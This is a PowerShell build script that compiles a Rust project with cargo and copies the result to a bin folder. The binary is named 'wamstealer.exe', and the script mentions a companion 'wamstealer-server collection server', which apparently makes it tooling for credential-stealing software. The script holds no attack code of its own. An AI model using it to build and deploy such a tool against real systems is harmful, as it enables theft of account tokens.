[CmdletBinding()]
param(
    [ValidateSet('Debug', 'Release')]
    [string]$Configuration = 'Release'
)

$ErrorActionPreference = 'Stop'
if ($env:OS -ne 'Windows_NT') {
    throw 'This build script requires Windows with Rust and Visual Studio C++ Build Tools.'
}
Get-Command cargo -ErrorAction Stop | Out-Null

$target = 'x86_64-pc-windows-msvc'
$profile = if ($Configuration -eq 'Release') { 'release' } else { 'debug' }
$buildArguments = @('build', '--locked', '--target', $target)
if ($Configuration -eq 'Release') {
    $buildArguments += '--release'
}

# Build from the directory containing Cargo.toml and Cargo.lock.
Push-Location $PSScriptRoot
try {
    & cargo @buildArguments
    if ($LASTEXITCODE -ne 0) {
        throw "Rust build failed with exit code $LASTEXITCODE."
    }
    $metadataJson = & cargo metadata --locked --no-deps --format-version 1
    if ($LASTEXITCODE -ne 0) {
        throw "Could not locate the Cargo output directory (exit code $LASTEXITCODE)."
    }
    $metadata = ($metadataJson -join "`n") | ConvertFrom-Json
    $executable = Join-Path $metadata.target_directory "$target\$profile\wamstealer.exe"
    $outputDirectory = Join-Path $PSScriptRoot "bin\$Configuration"
    New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
    $output = Join-Path $outputDirectory 'wamstealer.exe'
    Copy-Item -LiteralPath $executable -Destination $output -Force
    Write-Output "Built $output"
    Write-Output 'The wamstealer-server collection server builds on Linux; run build.sh there.'
}
finally {
    Pop-Location
}
